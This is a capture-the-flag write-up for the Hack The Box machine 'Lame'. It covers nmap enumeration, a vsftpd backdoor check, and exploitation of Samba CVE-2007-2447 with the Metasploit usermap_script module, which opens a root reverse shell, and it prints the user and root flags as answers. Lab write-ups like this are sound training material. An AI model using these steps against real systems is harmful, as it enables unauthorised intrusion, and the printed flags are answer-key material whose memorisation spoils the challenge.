# Write-up: HTB “Lame”

## Enumeration

### Nmap Scan

I began with a service version scan against the target:

```bash
nmap -sV 10.129.244.139
```

**Results:**

- `21/tcp` → vsftpd 2.3.4
- `22/tcp` → OpenSSH 4.7p1 Debian 8ubuntu1
- `139/tcp`, `445/tcp` → Samba 3.0.20-Debian

**Answer Q1:** 4 ports open from top 1000

<img width="1080" height="315" alt="image" src="https://github.com/user-attachments/assets/803b5390-ed2e-4427-90f4-b5c88e353089" />

## FTP Service (Port 21)

Banner grab confirms **vsftpd 2.3.4**:

```bash
ftp 10.129.244.139
220 (vsFTPd 2.3.4)
```

**Answer Q2:** 2.3.4

<img width="1092" height="246" alt="image" src="https://github.com/user-attachments/assets/e1e034d1-91a1-4d2d-8b83-b860128b8125" />

### Backdoor Check

Version 2.3.4 is infamous for a backdoor (port 6200). I tested with nmap scripts:

```bash
nmap -p 21 --script ftp-vsftpd-backdoor 10.129.244.139
```

The scan shows **no backdoor triggered**.

**Answer Q3:** No, the exploit does not work here.

<img width="1090" height="214" alt="image" src="https://github.com/user-attachments/assets/daf2a128-33cb-47c6-8ea8-671ffd938be9" />

## SMB Service (Ports 139/445)

I queried SMB shares:

```bash
smbclient -L //10.129.244.139 -N
```

Output reveals Samba **3.0.20-Debian**.

**Answer Q4:** Samba 3.0.20

<img width="1087" height="353" alt="image" src="https://github.com/user-attachments/assets/1e1d44d3-635b-4ae2-b058-2078e0a6c831" />

## Vulnerability Research

Searching exploits for Samba 3.0.20 reveals **CVE-2007-2447**:

> Remote Code Execution via SamrChangePassword request and shell metacharacter injection when “username map script” is enabled.
> 

**Answer Q5:** CVE-2007-2447

## Exploitation with Metasploit

I launched the exploit:

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 10.129.244.139
msf6 exploit(usermap_script) > set LHOST <vpn_ip>
msf6 exploit(usermap_script) > run
```

This yielded a remote shell.

**Answer Q6:** Exploit spawns a shell as **root**

<img width="1091" height="345" alt="image" src="https://github.com/user-attachments/assets/96752ff3-d024-4346-9d45-4e10fac60837" />

## Looting User Flag

Navigated to makis’ home:

<img width="1092" height="777" alt="image" src="https://github.com/user-attachments/assets/03703856-ee53-423d-a8be-2ad2742c03b4" />

**Answer Q7**:

```php
4d4e869a2339482566ea36be13342073
```

## Looting Root Flag

Since the exploit already gave root access:

```bash
cd /root
cat root.txt
```

Flag:

```
b9b337f4c6e5b2f54b25a719198210f5
```

**Answer Q8**: `b9b337f4c6e5b2f54b25a719198210f5`

<img width="1080" height="422" alt="image" src="https://github.com/user-attachments/assets/e32981d7-5c6a-4d6b-ad53-05f5c0477297" />
